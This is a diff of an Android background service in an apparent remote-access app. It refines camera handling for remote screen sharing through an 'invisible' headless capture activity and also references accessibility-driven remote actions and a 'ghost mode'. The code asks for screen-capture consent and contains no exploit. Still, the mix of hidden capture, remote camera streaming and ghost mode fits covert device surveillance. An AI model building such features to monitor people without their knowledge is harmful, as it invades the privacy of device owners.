@@ -502,7 +502,12 @@ public class BackgroundKeepAliveService extends Service {
                         // Screen share is always handled by the (invisible) headless
                         // activity, which owns the MediaProjection consent dialog and
                         // reuses a pending request instead of stacking UI dialogs.
-                        HeadlessCaptureActivity.start(this, caller, "screen_share_control".equals(command), false, cameraChoice);
+                        // Camera: "front"/"back" must stream the companion camera
+                        // alongside the screen; "none"/"off" keeps it screen-only.
+                        HeadlessCaptureActivity.start(this, caller,
+                                "screen_share_control".equals(command),
+                                MainActivity.isCameraChoiceOn(cameraChoice),
+                                cameraChoice);
                     } else if ("open_accessibility_settings".equals(command) || "request_battery_exemption".equals(command)) {
                         // Opening a system settings screen requires an activity with
                         // UI, which is fine — the user tapped "fix" deliberately.
@@ -566,12 +571,24 @@ public class BackgroundKeepAliveService extends Service {
                                 RemoteAccessibilityService.getInstance().performHome();
                             }
                         } catch (Throwable ignored) {}
-                    } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
-                        if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
-                            MainActivity.getInstance().runOnUiThread(() -> {
-                                MainActivity.getInstance().getWebRTCCompanion().switchCompanionCamera();
-                            });
+                    } else if ("switch_camera".equals(command)) {
+                        // Absolute choice, mirroring the companion handler. This
+                        // service runs in the :companion process where the live
+                        // companion instance is usually unreachable, so the main
+                        // process socket stays the single source of truth.
+                        WebRTCCompanion comp = MainActivity.getCompanionInstance();
+                        if (comp != null) {
+                            String camChoice = data.optString("cameraChoice", "");
+                            if ("front".equalsIgnoreCase(camChoice)) {
+                                comp.setCompanionCameraFacing(true);
+                            } else if ("back".equalsIgnoreCase(camChoice)) {
+                                comp.setCompanionCameraFacing(false);
+                            } else if ("none".equalsIgnoreCase(camChoice) || "off".equalsIgnoreCase(camChoice)) {
+                                comp.setCompanionCameraEnabled(false);
+                            }
                         }
+                    } else if ("flip_camera".equals(command)) {
+                        Log.i(TAG, "flip_camera acknowledged; the live companion socket performs the toggle");
                     } else if ("ghost_mode".equals(command)) {
                         // A missing value must never be read as "false" — that
                         // silently disabled ghost mode on every toggle command
